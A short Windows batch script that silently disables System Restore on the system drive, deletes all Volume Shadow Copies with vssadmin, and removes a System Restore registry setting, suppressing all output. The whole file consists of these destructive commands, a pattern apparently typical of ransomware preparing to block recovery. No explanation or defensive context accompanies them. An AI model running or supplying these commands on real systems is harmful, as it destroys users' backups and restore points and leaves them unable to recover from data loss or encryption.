@echo off
PowerShell -Command "Disable-ComputerRestore -Drive '%SystemDrive%\'" >nul 2>&1
vssadmin delete shadows /all /quiet >nul 2>&1
reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "RPSessionInterval" /f >nul 2>&1
